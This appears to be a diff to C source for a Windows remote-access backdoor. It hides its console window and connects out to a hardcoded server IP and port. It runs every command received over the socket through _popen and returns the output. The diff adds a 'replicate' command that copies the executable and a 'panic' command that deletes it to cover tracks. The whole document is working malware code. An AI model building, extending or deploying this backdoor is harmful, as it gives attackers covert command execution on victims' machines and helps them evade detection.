@@ -9,15 +9,17 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <tchar.h>
+
 
 //Function that sets variable to 0 Used to reinitialize buff and other arrays
 #define bzero(p, size) (void) memset ((p), 0, (size))
 
 
 
-unsigned short ServPort = 50005;//Server Port
-char *ServIP  = "192.168.174.129";//Server IP
-int stealth_bool = 1//Change to 0 to hide window <-------Change stealth HERE
+unsigned short ServPort = 8888;//Server Port
+char *ServIP  = "192.168.1.49";//Server IP
+int stealth_bool = 1;//Change to 0 to hide window <-------Change stealth HERE
 
 
 
@@ -94,6 +96,67 @@ str_cut(char str[], int slice_from, int slice_to){
 	return buffer;
 }
 
+int replicate() {
+    TCHAR szFileName[MAX_PATH];
+    DWORD dwResult = GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+    if (dwResult == 0) {
+        _tprintf(_T("GetModuleFileName failed with error %d\n"), GetLastError());
+        return 1;
+    }
+
+    TCHAR szDestinationFile[MAX_PATH];
+    char ret[128];
+    TCHAR szFileExtension[MAX_PATH];
+    _tsplitpath(szFileName, NULL, NULL, NULL, szFileExtension);
+
+    _stprintf(szDestinationFile, _T("%s_copy%s"), szFileName, szFileExtension);
+
+    BOOL bResult = CopyFile(szFileName, szDestinationFile, FALSE);
+
+    if (!bResult) {
+        _tprintf(_T("CopyFile failed with error %d\n"), GetLastError());
+        send(sock,ret, sizeof(ret),0);
+        return 1;
+    }
+    sprintf(ret,("Copied %s to %s\n"), szFileName, szDestinationFile);
+    send(sock,ret, sizeof(ret),0);
+    return 0;
+}
+
+int panic() {
+    TCHAR szFileName[MAX_PATH];
+    DWORD dwResult = GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+    if (dwResult == 0) {
+        return 1;
+    }
+
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    TCHAR szCommandLine[MAX_PATH];
+    _stprintf(szCommandLine, _T("cmd /c del \"%s\""), szFileName);
+
+    BOOL bResult = CreateProcess(NULL, szCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+
+    if (!bResult) {
+       
+        return 1;
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return 0;
+}
+
+
 //Main Function wich is called
 void Shell(){ //Once connected execute custom commands or bash
 	char buffer[1024];
@@ -125,9 +188,16 @@ void Shell(){ //Once connected execute custom commands or bash
 			sh_bool = 0;
 		}
 		else if(strncmp("panic", buffer, 5) == 0){//Use "panic" to clean up all tracks and terminate connection
+			panic();
 			char panic[128] = "Cleaning Up and Exiting ... \n";
 			send(sock, panic, sizeof(panic),0);
 		}
+		else if(strncmp("replicate", buffer, 9) == 0){//make copy in the same folder
+			char repl[128] = "Replicating executable\n";
+			send(sock, repl, sizeof(repl),0);
+			int ret = replicate();
+			
+		}	
     		else {	//Else send raw data
 			FILE *fp; //Create File descriptor
 			fp = _popen(buffer, "r"); // open a process and execute command from buffer (r = read)
@@ -166,7 +236,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	HWND stealth;
 	AllocConsole();
 	stealth = FindWindow("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, stealth_bool);/
+	ShowWindow(stealth, stealth_bool);
 	do{
 		if(stealth_bool == 0) printf("Trying to connect to server\n");
 		//2) DEFINE NETWORKNG STUFF NEEDED 
